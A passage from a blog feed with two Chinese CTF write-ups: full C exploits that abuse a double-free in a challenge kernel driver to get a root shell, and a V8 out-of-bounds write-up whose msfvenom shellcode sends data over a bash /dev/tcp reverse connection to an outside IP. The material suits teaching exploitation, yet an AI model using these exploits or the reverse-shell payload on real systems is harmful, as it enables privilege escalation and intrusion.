ioctl(fd,FREE,14);</span><br><span class="line">            ioctl(fd,FREE,15);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013511.png" alt></p><p>貌似已经提权成功了。这种方法确实奏效，但是当我多执行一些指令的时候内核又会panic :(<br>怎么办呢？</p><h2><span id="exploit-加固">Exploit 加固</span></h2><p>由于panic的核心原因在于把 cred info 当作地址来申请堆块，那么在这个方向思考的话，其实可以通过一个free的写指针操作把 cred info 覆盖为一个有效的 chunk 地址，也就是free链表的尾 chunk 地址。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * main.c</span><br><span class="line"> * Copyright (C) 2019 P1umer &lt;cz18811105578@gmail.com&gt;</span><br><span class="line"> */</span><br><span class="line">// gcc exp.c -o exp --static -lpthread</span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;linux/prctl.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define MALLOC 0x271A</span><br><span class="line">#define FREE   0x2766</span><br><span class="line">#define EDIT1  0x1A0A</span><br><span class="line">#define EDIT2  0x22B8 </span><br><span class="line">pid_t pid;</span><br><span class="line"></span><br><span class="line">void debug()&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;,0);</span><br><span class="line">    debug();</span><br><span class="line">    ioctl(fd,MALLOC,0);</span><br><span class="line">    ioctl(fd,MALLOC,1);</span><br><span class="line">    ioctl(fd,MALLOC,2);</span><br><span class="line">    ioctl(fd,MALLOC,3);</span><br><span class="line">    ioctl(fd,MALLOC,4);</span><br><span class="line">    ioctl(fd,MALLOC,5);</span><br><span class="line">    ioctl(fd,MALLOC,6);</span><br><span class="line">    ioctl(fd,MALLOC,7);</span><br><span class="line">    ioctl(fd,MALLOC,8);</span><br><span class="line">    ioctl(fd,MALLOC,9);</span><br><span class="line">    ioctl(fd,MALLOC,10);</span><br><span class="line">    ioctl(fd,MALLOC,11);</span><br><span class="line">    ioctl(fd,MALLOC,12);</span><br><span class="line">    ioctl(fd,MALLOC,13);</span><br><span class="line">    ioctl(fd,MALLOC,14);</span><br><span class="line">    ioctl(fd,MALLOC,15);</span><br><span class="line">    ioctl(fd,MALLOC,16);</span><br><span class="line">    ioctl(fd,MALLOC,17);</span><br><span class="line">    </span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line">    ioctl(fd,FREE,16);</span><br><span class="line">    ioctl(fd,FREE,17);</span><br><span class="line"></span><br><span class="line">    pid=fork();</span><br><span class="line"></span><br><span class="line">    if(pid==0)&#123;</span><br><span class="line">        sleep(1);</span><br><span class="line">        printf(&quot;[+] root&quot;);</span><br><span class="line">        system(&quot;whoami&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;[+] shell close&quot;);</span><br><span class="line">        ioctl(fd,FREE,17);</span><br><span class="line">        ioctl(fd,MALLOC,17);</span><br><span class="line"></span><br><span class="line">        ioctl(fd,MALLOC,16);</span><br><span class="line">        ioctl(fd,MALLOC,17);//cred==0 </span><br><span class="line"></span><br><span class="line">        ioctl(fd,FREE,0);</span><br><span class="line">        ioctl(fd,FREE,1);</span><br><span class="line">        ioctl(fd,FREE,2);</span><br><span class="line">        ioctl(fd,FREE,3);</span><br><span class="line">        ioctl(fd,FREE,4);</span><br><span class="line">        ioctl(fd,FREE,5);</span><br><span class="line">        ioctl(fd,FREE,6);</span><br><span class="line">        ioctl(fd,FREE,7);</span><br><span class="line">        ioctl(fd,FREE,8);</span><br><span class="line">        ioctl(fd,FREE,9);</span><br><span class="line">        ioctl(fd,FREE,10);</span><br><span class="line">        ioctl(fd,FREE,11);</span><br><span class="line">        ioctl(fd,FREE,12);</span><br><span class="line">        ioctl(fd,FREE,13);</span><br><span class="line">        ioctl(fd,FREE,14);</span><br><span class="line">        ioctl(fd,FREE,15);</span><br><span class="line">        sleep(100);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>主进程通过 UAF 再次把 chunk17 free 了一次，复写里面的Cred info 为 chunk16 的地址，然后再次申请堆块把链表恢复为原状态。同时在父进程中加了sleep函数提高稳定性。</p><p>这时候已经得到了稳定的 root shell :)<br><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190515013535.png" alt></p><h2><span id="更多的思考">更多的思考</span></h2><p>还有一种更为精简的解法, 从一开始没有考虑 doublefree ：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">#define DEL         0x2766</span><br><span class="line">#define SET_ZEGE     0x22B8  // 0x123456789ABCDEF0LL</span><br><span class="line">#define ALLOC         0x271A</span><br><span class="line">#define SET_JIGE     0x1A0A  // 0xFEDCBA987654321LL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int fd = open(&quot;/dev/tshop&quot;, 0);</span><br><span class="line">    size_t heap_addr , kernel_addr,mod_addr;</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;[-] bad open /dev/tshop\n&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, ALLOC, 0);</span><br><span class="line">    ioctl(fd, ALLOC, 1);</span><br><span class="line">    ioctl(fd, DEL, 0);</span><br><span class="line">    ioctl(fd, DEL, 1);</span><br><span class="line">    int pid=fork();</span><br><span class="line">    ioctl(fd, DEL, 1);</span><br><span class="line">    ioctl(fd, ALLOC, 3);</span><br><span class="line">    //getchar();</span><br><span class="line">    //getchar();</span><br><span class="line">    if (pid &lt; 0) &#123;</span><br><span class="line">        puts(&quot;[-] fork error!&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125; else if (pid == 0) &#123;</span><br><span class="line">        if (getuid() == 0) &#123;</span><br><span class="line">            puts(&quot;[+] root&quot;);</span><br><span class="line">            system(&quot;cat /home/sunichi/flag&quot;);</span><br><span class="line">            system(&quot;id&quot;);</span><br><span class="line">            system(&quot;/bin/sh&quot;)</span><br><span class="line">            exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        sleep(30);</span><br><span class="line">        puts(&quot;[+] parent exit&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体思路：</p><ul><li>alloc并free掉两块内存，使他们接入slab cache链表的尾部，这里暂且给它编号为chunk0和chunk1</li><li>由于采用FIFO算法，此时slab缓存的单向链表最尾端的chunk为chunk1，而且第一个8字节存储的是指向chunk0的指针，当ALLOC新cache时，将优先取出chunk1分配给进程。</li><li>fork一个子进程，这个子进程的cred结构体会复用此前我们free掉的内存块（chunk1）<br>此时，堆块中的cred如下：<br><img src="https://t3ls.club/usr/uploads/2019/05/4059141535.png" alt></li><li>我们的目标是将cred的id位置零，首先就需要再次拿到cred所在堆块（chunk1）</li><li>free并立即进行alloc操作，chunk1就会挂到cache链上后再次被申请回来。</li><li>由于ALLOC操作伴随着所在堆块数据的初始化，于是我们不用再有多余的操作便能将cred结构体uid及gid位置零。此时子进程就已成功提权（root）<br><img src="https://t3ls.club/usr/uploads/2019/05/2160439120.png" alt></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Intro-Linux-Kernel-的第一次探索&quot;&gt;&lt;a href=&quot;#Intro-Linux-Kernel-的第一次探索&quot; class=&quot;headerlink&quot; title=&quot;Intro: Linux Kernel 的第一次探索&quot;&gt;&lt;/a&gt;Intro: Linux Kernel 的第一次探索&lt;/h2&gt;
    
    </summary>
    
      <category term="Linux Kernel" scheme="http://p1umer.gituhb.io/categories/Linux-Kernel/"/>
    
    
      <category term="Kernel" scheme="http://p1umer.gituhb.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>StarCTF OOB writeup</title>
    <link href="http://p1umer.gituhb.io/2019/05/06/Star-CTF-OOB-writeup/"/>
    <id>http://p1umer.gituhb.io/2019/05/06/Star-CTF-OOB-writeup/</id>
    <published>2019-05-06T14:04:29.000Z</published>
    <updated>2019-07-04T15:38:05.918Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="intro-一道-starctf-上的-v8-引擎-writeup">Intro: 一道 StarCTF 上的 V8 引擎 Writeup</span></h2> <a id="more"></a><h2><span id="写在前面">写在前面</span></h2><p>借着 *CTF 的机会更新一篇有关 v8 引擎漏洞利用相关的博客。前不久刚刚结束的Star CTF上拿到了 OOB 的三血，下面为 WriteUp.</p><h2><span id="分析">分析</span></h2><h3><span id="patch">patch</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();//check len&lt;=2,else return undefine</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len == 1)&#123;</span><br><span class="line">+        //read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        //write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><p>漏洞很明显，注册的buildin函数提供了一个单位的数组越界读写权限。</p><h3><span id="原语">原语:</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read  =&gt; arr.oob() // return arr[arr.length]</span><br><span class="line">write =&gt; arr.oob(xxxx)//arr[arr.length]=xxxx</span><br></pre></td></tr></table></figure><h2><span id="内存示例">内存示例</span></h2><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[ class / map ] -&gt; ... ; 指向内部类</span><br><span class="line">[ properties  ] -&gt; [empty array]</span><br><span class="line">[ elements    ] -&gt; [empty array] ; 数值类型名称的属性</span><br><span class="line">[ reserved #1 ] -\</span><br><span class="line">[ reserved #2 ]  |</span><br><span class="line">[ reserved #3 ]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............  |</span><br><span class="line">[ reserved #N ] -/</span><br></pre></td></tr></table></figure><p>其中 map 字段代表了 V8 针对属性访问的隐藏类，其中的资料可以参考:</p><p>[+] <a href="https://segmentfault.com/a/1190000008188648" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008188648</a></p><h2><span id="利用思路">利用思路</span></h2><ul><li>考虑复写 map 进行对象的 Type Confusion，从而针对Array进行map伪造，通过obj的map的来访问arr的length字段，从而达到数组长度的改写。</li><li>针对 smi 的 arr 进行了map伪造从而修改length，紧接着利用该溢出arr构造了double类型arr进行任意地址读写原语的构造(wasm一把梭)。</li><li>具体的相关偏移以及GC的影响需要gdb调试。</li><li>其中，我们尝试了nc反弹，bash反弹，本地以及自己搭建的服务器均成功利用。</li></ul><h2><span id="shellcode-构造">shellcode 构造</span></h2><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="hljs-built_in">exec</span> CMD=<span class="hljs-string">"bash -c '/get_flag &amp;&gt;/dev/tcp/39.106.1.205/23333 0&gt;&amp;1'"</span> -f python -b <span class="hljs-string">'\x00\x0b'</span></span><br></pre></td></tr></table></figure><h2><span id="exploit">exploit</span></h2><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hex</span>(<span class="hljs-params">b</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> (<span class="hljs-string">'0'</span> + b.toString(<span class="hljs-number">16</span>)).substr(<span class="hljs-number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexlify</span>(<span class="hljs-params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">var</span> res = [];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; bytes.length; i++)</span><br><span class="line">        res.push(hex(bytes[i]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> res.join(<span class="hljs-string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unhexlify</span>(<span class="hljs-params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (hexstr.length % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">TypeError</span>(<span class="hljs-string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">var</span> bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(hexstr.length / <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; hexstr.length; i += <span class="hljs-number">2</span>)</span><br><span class="line">        bytes[i/<span class="hljs-number">2</span>] = <span class="hljs-built_in">parseInt</span>(hexstr.substr(i, <span class="hljs-number">2</span>), <span class="hljs-number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hexdump</span>(<span class="hljs-params">data</span>) </span>&#123;</span><br><span class="line">    <span 